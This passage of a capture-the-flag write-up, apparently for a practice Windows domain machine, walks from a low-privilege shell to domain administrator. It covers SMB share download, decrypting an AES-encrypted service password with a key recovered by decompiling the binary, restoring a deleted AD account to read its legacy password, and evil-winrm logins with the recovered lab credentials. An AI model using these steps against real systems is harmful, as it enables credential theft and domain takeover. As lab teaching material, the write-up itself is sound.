Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> ls ..\Desktop


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/18/2021   3:32 PM             34 user.txt
-a----         2/4/2021   4:24 PM           1031 WinDirStat.lnk
```

---

## SMB Enumeration as `s.smith`

`s.smith` has access to the `Audit$` share.

```bash
$ smbmap -u "s.smith" -p "sT333ve2" -P 445 -H 10.129.203.112
[+] IP: 10.129.203.112:445      Name: 10.129.203.112
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share
```

```bash
$ smbclient -U s.smith '//10.129.203.112/Audit$'
Enter WORKGROUP\s.smith's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 13:01:26 2020
  ..                                  D        0  Wed Jan 29 13:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 16:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 13:00:20 2020
  DB                                  D        0  Tue Jan 28 16:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 18:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 02:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 02:38:38 2019
  x64                                 D        0  Sun Jan 26 17:25:27 2020
  x86                                 D        0  Sun Jan 26 17:25:27 2020

                6553343 blocks of size 4096. 1625199 blocks available
```

Exfiltrate the entire share.

```bash
$ smbget -R --user=s.smith 'smb://10.129.203.112/Audit$'
Password for [s.smith] connecting to //Audit$/10.129.203.112:
Using workgroup WORKGROUP, user s.smith
smb://10.129.203.112/Audit$/CascAudit.exe
smb://10.129.203.112/Audit$/CascCrypto.dll
smb://10.129.203.112/Audit$/DB/Audit.db
smb://10.129.203.112/Audit$/RunAudit.bat
smb://10.129.203.112/Audit$/System.Data.SQLite.dll
smb://10.129.203.112/Audit$/System.Data.SQLite.EF6.dll
smb://10.129.203.112/Audit$/x64/SQLite.Interop.dll
smb://10.129.203.112/Audit$/x86/SQLite.Interop.dll
Downloaded 3.33MB in 27 seconds
```

---

## Audit SQLite DB Enumeration

The `Audit$` share contains a SQLite database file, `Audit.db`. Interact with it via the `sqlite3` tool.

```bash
$ sqlite3 Audit.db
SQLite version 3.36.0 2021-06-18 18:36:39
Enter ".help" for usage hints.
sqlite>
```

Dump the table names.

```sql
sqlite> SELECT name FROM sqlite_master WHERE type = 'table';
Ldap
sqlite_sequence
Misc
DeletedUserAudit
```

The `DeletedUserAudit` table's columns:

```sql
sqlite> SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'DeletedUserAudit';
CREATE TABLE "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
)
```

The `DeletedUserAudit` table's data:

```sql
sqlite> select * from DeletedUserAudit;
6|test|Test DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
```

This appears to contain all of the users deleted by the `ArkSvc` account, as noted from previous enumeration of the `Data` SMB share.

The `ldap` table's data:

```sql
sqlite> select * from ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

It appears to contain the password of the `ArkSvc` account. This is the account that was responsible for deleting the `TempAdmin` user account. However, decoding the base64-encoded field results in unreadable text, indicating that it is probably encrypted.

---

## Reverse Engineering the Auditing Binary

The entrypoint of the auditing process appears to be the batch script `RunAudit.bat`, which executes `CascAudit.exe` with the path to the SQLite database file.

```bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```

The next logical step would be to reverse engineer the `CascAudit.exe` binary, as it appears to interact with the `Audit.db` database and thus, might contain either `ArkSvc`'s credential or the encryption key and algorithm used to encrypt it before storing it in the database.

Determine what kind of executables the files are.

```bash
$ file CascAudit.exe
CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
$ file CascCrypto.dll
CascCrypto.dll: PE32 executable (DLL) (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

They are both .NET assemblies, which means they can be decompiled with [dnSpy](https://github.com/dnSpy/dnSpy).

Decompiling and analyzing `CascAudit.exe`, its `Main` function retrieves all of the rows from the `LDAP` table and for each row, decrypts the password with the following line:

```c#
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
```

This function base64 decodes the encrypted string and then decrypts it with the AES algorithm using the key passed into the `Crypto.DecryptString` function (`c4scadek3y654321`) and the initialization vector `1tdyjCbY1Ix49842`.

```c#
public static string DecryptString(string EncryptedString, string Key)  {
	byte[] array = Convert.FromBase64String(EncryptedString);
	Aes aes = Aes.Create();
	aes.KeySize = 128;
	aes.BlockSize = 128;
	aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
	aes.Mode = CipherMode.CBC;
	aes.Key = Encoding.UTF8.GetBytes(Key);
	string @string;
	using (MemoryStream memoryStream = new MemoryStream(array))  {
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))  {
			byte[] array2 = new byte[checked(array.Length - 1 + 1)];
			cryptoStream.Read(array2, 0, array2.Length);
			@string = Encoding.UTF8.GetString(array2);  
		}
	}
	return @string;
}
```

Use [Cyber Chef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdz09) to reverse this process and recover `ArkSvc`'s password: `w3lc0meFr31nd`.

![](images/Pasted%20image%2020211119113729.png)

```bash
$ crackmapexec smb 10.129.203.254 -d cascade.local -u ArkSvc -p w3lc0meFr31nd
SMB         10.129.203.254  445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.203.254  445    CASC-DC1         [+] cascade.local\ArkSvc:w3lc0meFr31nd
````

---

## `arksvc`'s Domain Graph

`arksvc` is a member of the `Remote Management Users`, `AD Recycle Bin`, and `IT` groups.

![](images/Pasted%20image%2020211119124538.png)

Prior enumeration of the `Data` SMB share indicated that the `TempAdmin` account was moved into the `AD Recycle Bin`. Since `arksvc` is a member of the `AD Recycle Bin` group, it is able to retrieve the `TempAdmin` user account.

---

## Retrieving the Deleted `TempAdmin` Account

Login via WinRM.

```bash
$ evil-winrm -i 10.129.203.254 -u cascade.local\\arksvc -p w3lc0meFr31nd

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc
```

Use the PowerShell Active Directory Module installed on the target to retrieve the deleted user account.

```powershell
*Evil-WinRM* PS C:\Users\arksvc> Get-ADObject -Filter 'Deleted -eq $true' -IncludeDeletedObjects -Properties * | ? {$_.DistinguishedName.ToString() -eq "CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local"}

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Just like `r.thompson`, `TempAdmin` has the `cascadeLegacyPwd` attribute set to `YmFDVDNyMWFOMDBkbGVz`. Base64 decoding this yields the password `baCT3r1aN00dles`.

---

## Administrative Access

The original note about the `TempAdmin` account mentioned that it had the same password as the domain administrator. Use the credential `Administrator`:`baCT3r1aN00dles` to access the target via WinRM and grab the system flag.

```bash
$ evil-winrm -i 10.129.203.254 -u cascade.local\\Administrator -p baCT3r1aN00dles

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/19/2021   2:00 PM             34 root.txt
```
